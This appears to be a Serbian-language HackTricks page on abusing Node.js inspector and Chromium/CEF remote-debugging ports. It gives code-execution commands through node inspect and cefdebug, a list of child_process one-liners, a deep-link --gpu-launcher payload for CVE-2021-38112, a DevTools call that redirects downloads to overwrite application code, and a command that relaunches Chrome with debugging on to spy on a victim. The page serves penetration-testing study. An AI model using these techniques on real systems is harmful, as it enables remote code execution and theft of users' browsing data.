# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

[Iz dokumenata](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Kada se pokrene sa `--inspect` opcijom, Node.js proces sluša za klijentom za debagovanje. Po **defaultu**, sluša na adresi i portu **`127.0.0.1:9229`**. Svakom procesu je takođe dodeljen **jedinstveni** **UUID**.

Klijenti inspektora moraju znati i odrediti adresu hosta, port i UUID za povezivanje. Puna URL adresa će izgledati otprilike kao `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Pošto **debugger ima pun pristup Node.js okruženju izvršavanja**, zlonamerna osoba koja može da se poveže na ovaj port može biti u mogućnosti da izvrši proizvoljan kod u ime Node.js procesa (**potencijalna eskalacija privilegija**).

Postoji nekoliko načina da se pokrene inspektor:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kada pokrenete inspekcijski proces, nešto poput ovoga će se pojaviti:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) moraju koristiti parametar: `--remote-debugging-port=9222` da bi otvorili **debugger** (zaštite od SSRF ostaju vrlo slične). Međutim, oni **umesto** davanja **NodeJS** **debug** sesije će komunicirati sa pregledačem koristeći [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), ovo je interfejs za kontrolu pregledača, ali ne postoji direktan RCE.

Kada pokrenete debagovani pregledač, nešto poput ovoga će se pojaviti:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets i politika iste domene <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web sajtovi otvoreni u web-pretraživaču mogu da prave WebSocket i HTTP zahteve pod modelom bezbednosti pretraživača. **Početna HTTP veza** je neophodna da bi se **dobio jedinstveni ID sesije debagera**. **Politika iste domene** **sprečava** web sajtove da mogu da naprave **ovu HTTP vezu**. Za dodatnu bezbednost protiv [**DNS rebinding napada**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js proverava da li **'Host' zaglavlja** za vezu ili specificiraju **IP adresu** ili **`localhost`** ili **`localhost6`** tačno.

> [!NOTE]
> Ove **bezbednosne mere sprečavaju iskorišćavanje inspektora** za pokretanje koda **samo slanjem HTTP zahteva** (što bi moglo biti učinjeno iskorišćavanjem SSRF ranjivosti).

### Pokretanje inspektora u aktivnim procesima

Možete poslati **signal SIGUSR1** aktivnom nodejs procesu da bi **pokrenuo inspektora** na podrazumevanom portu. Međutim, imajte na umu da morate imati dovoljno privilegija, tako da ovo može omogućiti **privilegovan pristup informacijama unutar procesa** ali ne i direktnu eskalaciju privilegija.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Ovo je korisno u kontejnerima jer **gašenje procesa i pokretanje novog** sa `--inspect` **nije opcija** jer će **kontejner** biti **ubijen** zajedno sa procesom.

### Povezivanje sa inspektorom/debuggerom

Da biste se povezali sa **pregledačem zasnovanim na Chromium-u**, možete pristupiti URL-ovima `chrome://inspect` ili `edge://inspect` za Chrome ili Edge, respektivno. Klikom na dugme Konfiguriši, treba osigurati da su **ciljni host i port** ispravno navedeni. Slika prikazuje primer daljinskog izvršavanja koda (RCE):

![](<../../images/image (674).png>)

Korišćenjem **komandne linije** možete se povezati sa debuggerom/inspektorom sa:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava **pronalaženje inspektora** koji se izvode lokalno i **ubacivanje koda** u njih.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> Imajte na umu da **NodeJS RCE eksploatiacije neće raditi** ako su povezane sa pregledačem putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (trebalo bi da proverite API da biste pronašli zanimljive stvari koje možete raditi sa njim).

## RCE u NodeJS Debuggeru/Inspektoru

> [!NOTE]
> Ako ste došli ovde tražeći kako da dobijete [**RCE iz XSS u Electron, molimo vas da proverite ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)

Neki uobičajeni načini za dobijanje **RCE** kada možete **povezati** sa Node **inspektorom** su korišćenje nečega poput (izgleda da ovo **neće raditi u vezi sa Chrome DevTools protokolom**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Možete proveriti API ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
U ovom odeljku ću samo navesti zanimljive stvari za koje sam primetio da su ljudi koristili za eksploataciju ovog protokola.

### Parameter Injection via Deep Links

U [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security je otkrio da je aplikacija zasnovana na CEF **registrovala prilagođeni UR**I u sistemu (workspaces://) koji je primao puni URI i zatim **pokretao CEF zasnovanu aplikaciju** sa konfiguracijom koja je delimično konstruisana iz tog URI-ja.

Otkriveno je da su URI parametri bili URL dekodirani i korišćeni za pokretanje CEF osnovne aplikacije, omogućavajući korisniku da **ubaci** flag **`--gpu-launcher`** u **komandnu liniju** i izvrši proizvoljne stvari.

Dakle, payload kao:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Izvršiće calc.exe.

### Prepisivanje Fajlova

Promeni fasciklu u kojoj će **preuzeti fajlovi biti sačuvani** i preuzmi fajl da **prepišeš** često korišćeni **izvorni kod** aplikacije svojim **zloćudnim kodom**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE i eksfiltracija

Prema ovom postu: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) moguće je dobiti RCE i eksfiltrirati interne stranice iz therivera.

### Post-eksploatacija

U pravom okruženju i **nakon kompromitovanja** korisničkog računara koji koristi Chrome/Chromium baziran pretraživač, mogli biste pokrenuti Chrome proces sa **aktiviranim debagovanjem i preusmeriti debag port** kako biste mu pristupili. Na ovaj način ćete moći da **inspektujete sve što žrtva radi sa Chrome-om i ukradete osetljive informacije**.

Prikradanje se postiže tako što se **okida svaki Chrome proces** i zatim poziva nešto poput
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Reference

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
